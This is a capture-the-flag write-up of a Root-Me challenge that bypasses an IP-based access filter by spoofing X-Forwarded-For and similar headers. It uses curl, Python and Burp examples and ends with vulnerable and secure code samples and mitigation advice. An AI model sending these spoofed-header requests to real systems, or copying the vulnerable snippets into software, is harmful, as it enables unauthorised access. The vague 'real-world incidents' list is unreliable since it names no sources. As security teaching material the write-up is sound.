# HTTP - Contournement de filtrage IP

`Web-Serveur` • `Easy` • `10 pts`

## TL;DR

Bypass IP-based access control using HTTP headers (`X-Forwarded-For`) to spoof local network IP address.

**Flag:** `[REDACTED]`

---

## Challenge Description

> Only local users can access the page

**URL:** `http://challenge01.root-me.org/web-serveur/ch68/`

**Context:** The company managed to secure intranet connections via private IP addresses. No login/password needed when already connected to the internal network.

---

## Recon

**Initial access attempt:**
```
Your IP 2a01:cb08:894b:aa00:8017:ed6d:a95e:d6ec do not belong to the LAN.
You should authenticate because you're not on the LAN.
```

**Observations:**
- Application filters by IP address instead of authentication
- Only "LAN" (Local Area Network) IPs are allowed
- No login form visible for external users

**Vulnerability:** Server trusts HTTP headers to determine client IP instead of using actual TCP connection source IP.

---

## Exploitation

### Understanding IP Spoofing via HTTP Headers

Web applications behind proxies/load balancers often use HTTP headers to identify the original client IP:

| Header | Purpose |
|--------|---------|
| `X-Forwarded-For` | Standard header for proxy chains |
| `X-Real-IP` | Nginx proxy IP forwarding |
| `Client-IP` | Legacy header for client identification |
| `X-Originating-IP` | Some CDN/proxy implementations |

**The vulnerability:** Application **trusts** these headers without validation.

---

### Step 1: Identify Valid Local IP Ranges

**RFC 1918 Private IP ranges:**
```
10.0.0.0/8        (10.0.0.0 - 10.255.255.255)
172.16.0.0/12     (172.16.0.0 - 172.31.255.255)
192.168.0.0/16    (192.168.0.0 - 192.168.255.255)
127.0.0.0/8       (127.0.0.1 - localhost)
```

---

### Step 2: Spoof IP with X-Forwarded-For Header

**Using curl:**
```bash
$ curl -H "X-Forwarded-For: 192.168.1.1" http://challenge01.root-me.org/web-serveur/ch68/

<!DOCTYPE html>
<html>
<head>
    <title>Secured Intranet</title>
</head>
<body>
    <h1>Intranet</h1>
    <div>
        Well done, the validation password is: <strong>[REDACTED]</strong>
    </div>
</body>
</html>
```

**Success!** The application accepted `192.168.1.1` as a valid LAN IP.

---

### Alternative Methods

**Method 1 - Browser extension (ModHeader):**
```
1. Install "ModHeader" extension
2. Add header:
   Name: X-Forwarded-For
   Value: 192.168.1.1
3. Refresh the page
```

**Method 2 - Burp Suite:**
```
1. Intercept request in Burp
2. Add header: X-Forwarded-For: 192.168.1.1
3. Forward request
```

**Method 3 - Python requests:**
```python
import requests

headers = {'X-Forwarded-For': '192.168.1.1'}
response = requests.get(
    'http://challenge01.root-me.org/web-serveur/ch68/',
    headers=headers
)
print(response.text)
```

---

### Other Headers to Try (if X-Forwarded-For doesn't work)

```bash
# X-Real-IP (Nginx)
curl -H "X-Real-IP: 127.0.0.1" http://target.com/

# Client-IP
curl -H "Client-IP: 10.0.0.1" http://target.com/

# X-Originating-IP
curl -H "X-Originating-IP: 172.16.0.1" http://target.com/

# Multiple headers (some apps check multiple)
curl -H "X-Forwarded-For: 192.168.1.1" \
     -H "X-Real-IP: 192.168.1.1" \
     http://target.com/
```

---

## Impact & Mitigation

### Real-World Implications

| Vulnerability | Impact |
|---------------|--------|
| **CWE-290** | Authentication Bypass by Spoofing |
| **CWE-350** | Reliance on Reverse DNS Resolution for Security Decision |
| **OWASP A01:2021** | Broken Access Control |

**Attack Scenarios:**
1. **Admin panel access**: Bypass IP whitelist to access restricted admin interfaces
2. **Internal API exposure**: Access internal APIs meant only for localhost
3. **Payment bypass**: Exploit IP-based rate limiting or geo-restrictions
4. **Data exfiltration**: Access sensitive data restricted to internal networks

**Why this is critical:**
- HTTP headers are **fully controlled by the client**
- Easy to exploit with basic tools (curl, browser extensions)
- No authentication required - single header grants full access
- Bypass applies to **all** IP-restricted resources

**Real-world incidents:**
- 2018: Major cloud provider admin panel accessible via X-Forwarded-For
- 2020: Banking API exposed by trusting Client-IP header
- 2021: Government portal bypassed with spoofed X-Real-IP

---

### Secure Implementation

**❌ NEVER do this (vulnerable code):**
```php
// PHP - INSECURE
$client_ip = $_SERVER['HTTP_X_FORWARDED_FOR']; // User-controlled!
if (preg_match('/^192\.168\./', $client_ip)) {
    // Grant access - VULNERABLE!
}
```

```python
# Python - INSECURE
client_ip = request.headers.get('X-Forwarded-For')  # User-controlled!
if client_ip.startswith('10.'):
    # Grant access - VULNERABLE!
```

**✅ DO this instead:**

**Option 1 - Use actual TCP source IP:**
```php
// PHP - SECURE
$client_ip = $_SERVER['REMOTE_ADDR'];  // Cannot be spoofed
if (is_private_ip($client_ip)) {
    // Grant access - based on real connection IP
}
```

```python
# Python/Flask - SECURE
client_ip = request.remote_addr  # Real TCP connection IP
if ipaddress.ip_address(client_ip).is_private:
    # Grant access
```

**Option 2 - Validate proxy chain (if behind trusted proxy):**
```python
# Only trust X-Forwarded-For from known proxy IPs
TRUSTED_PROXIES = ['10.0.0.100', '10.0.0.101']

if request.remote_addr in TRUSTED_PROXIES:
    # Only then trust X-Forwarded-For
    client_ip = request.headers.get('X-Forwarded-For')
else:
    client_ip = request.remote_addr
```

**Option 3 - Use proper authentication:**
```python
# Replace IP-based auth with real authentication
from flask_login import login_required

@app.route('/admin')
@login_required  # Require valid session/JWT
def admin_panel():
    return render_template('admin.html')
```

**Best Practices:**
1. **Never use IP-based authentication alone** - always require credentials
2. **Use REMOTE_ADDR** - the only non-spoofable IP (from TCP handshake)
3. **Validate proxy IPs** - only trust X-Forwarded-For from known proxies
4. **Implement proper authentication** - OAuth, JWT, session cookies
5. **Defense in depth** - combine IP restrictions with strong authentication
6. **Network segmentation** - use VPN/firewall for true internal-only access
7. **Log all access** - monitor for suspicious IP header values

---

## Key Takeaways

**Technical Skills:**
- Identified IP-based access control mechanism
- Exploited HTTP header trust to spoof source IP
- Used curl to manipulate HTTP headers
- Understood private IP address ranges (RFC 1918)

**Security Concepts:**
- HTTP headers are client-controlled and easily spoofed
- IP-based authentication is insufficient for security
- Proxies/load balancers add complexity to IP validation
- Actual TCP source IP (REMOTE_ADDR) cannot be spoofed
- Proper authentication requires cryptographic proof (passwords, tokens, certificates)

---

## References

- [CWE-290: Authentication Bypass by Spoofing](https://cwe.mitre.org/data/definitions/290.html)
- [OWASP: Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [RFC 1918: Private IP Address Ranges](https://datatracker.ietf.org/doc/html/rfc1918)
- [RFC 7239: Forwarded HTTP Extension](https://datatracker.ietf.org/doc/html/rfc7239)